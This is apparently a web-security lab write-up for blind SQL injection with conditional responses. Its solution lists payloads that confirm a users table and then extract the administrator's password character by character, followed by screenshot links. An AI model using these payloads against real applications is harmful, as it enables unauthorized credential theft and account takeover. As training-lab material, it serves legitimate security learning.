# Blind SQL injection with conditional responses

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/1381a1af-ac2f-43ba-9a66-0ad5248f5e21)

## Solution

' and 1=0--

' and (select 'x' from users LIMIT 1)='x'--

'and (select 'x' from users where username = 'administrator')='x'--

'and (select 'x' from users where username='administrator' and LENGTH(password)>1)='x'--

'AND (SELECT SUBSTRING(PASSWORD,1,1) FROM USERS WHERE USERNAME = 'administrator') = 'a'--

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/7614b49d-11be-4c23-a3d4-707db20258f8)

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/a4d4df17-cf4a-4742-a7a6-067ee103d76d)

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/5efec87f-7947-48d5-b9c7-54ac582bdf7b)

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/41982629-76ee-41b7-9f4e-5dab0c45b914)

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/ccba717b-9b34-44e4-b368-751f19c65037)

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/fb8e3f64-1d38-4c33-b41d-2cac44c19ad7)

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/86c171ad-aa7f-40cd-a57f-001f5e47896d)

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/509e65ea-1f59-4ce6-99b9-03119512701b)

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/4375a429-993a-4eb7-a98d-c0b3ebfe3b55)

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/067e0c39-0c9e-4e59-ae39-3be435c39a46)
